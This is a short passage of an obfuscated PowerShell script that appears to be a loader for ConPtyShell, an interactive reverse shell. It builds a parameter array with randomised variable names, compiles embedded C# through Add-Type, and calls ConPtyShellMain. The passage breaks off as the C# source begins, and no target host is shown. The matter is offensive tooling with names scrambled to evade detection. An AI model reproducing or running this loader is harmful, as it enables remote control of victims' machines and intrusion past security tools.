...
{   
    ...
    $pGbFiBZj99 = @($CIUeKBxu99, $SdGQpwiU99, $Rows, $Cols, $DMsRQtTn99)
    Add-Type -TypeDefinition $RSDMohRK99 -Language CSharp;
    $MelhiQwo99 = [ConPtyShellMainClass]::ConPtyShellMain($pGbFiBZj99)
    Write-Output $MelhiQwo99
}
$RSDMohRK99 = @"
using System;
using System.IO;
